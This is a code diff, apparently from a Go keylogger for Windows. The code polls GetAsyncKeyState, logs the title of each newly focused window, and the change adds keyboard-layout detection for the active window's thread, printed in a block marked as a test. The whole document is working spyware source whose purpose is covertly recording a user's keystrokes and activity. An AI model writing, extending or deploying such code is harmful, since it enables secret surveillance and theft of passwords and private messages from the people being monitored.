@@ -12,10 +12,12 @@ import (
 )
 
 var (
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
-	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
-	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
+	user32                       = syscall.NewLazyDLL("user32.dll")
+	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
+	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
+	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
+	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
+	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
 
 	tmpTitle string
 )
@@ -25,11 +27,34 @@ var tmpWindow = make(chan string)
 
 func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
+
 	if e1 != 0 {
 		err = error(e1)
 		return
 	}
 	hwnd = syscall.Handle(r0)
+	return
+}
+
+func getKeyboardLayout(dword syscall.Handle) (hkl syscall.Handle, err error) {
+	r0, _, e1 := syscall.Syscall(procGetKeyboardLayout.Addr(), 1, uintptr(dword), 0, 0)
+
+	if e1 != 0 {
+		err = error(e1)
+		return
+	}
+	hkl = syscall.Handle(r0)
+	return
+}
+
+func getWindowThreadProcessID(hwnd syscall.Handle) (dword syscall.Handle, err error) {
+	r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessID.Addr(), 1, uintptr(hwnd), 0, 0)
+
+	if e1 != 0 {
+		err = error(e1)
+		return
+	}
+	dword = syscall.Handle(r0)
 	return
 }
 
@@ -49,17 +74,30 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 
 func windowLogger() {
 	for {
-		processID, getForegroundWindowErr := getForegroundWindow()
+		foreground, getForegroundWindowErr := getForegroundWindow()
 		if getForegroundWindowErr != nil {
 			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
 		}
 		window := make([]uint16, 200)
-		getWindowText(processID, &window[0], int32(len(window)))
+		getWindowText(foreground, &window[0], int32(len(window)))
 
 		if syscall.UTF16ToString(window) != "" {
 			if tmpTitle != syscall.UTF16ToString(window) {
 				tmpTitle = syscall.UTF16ToString(window)
 				tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
+
+				// TEST
+				hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foreground)
+				if getWindowThreadProcessIDErr != nil {
+					log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
+				}
+				hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)
+
+				if getKeyboardLayoutErr != nil {
+					log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
+				}
+
+				fmt.Println("HKL ", hkl)
 			}
 		}
 		time.Sleep(1 * time.Millisecond)
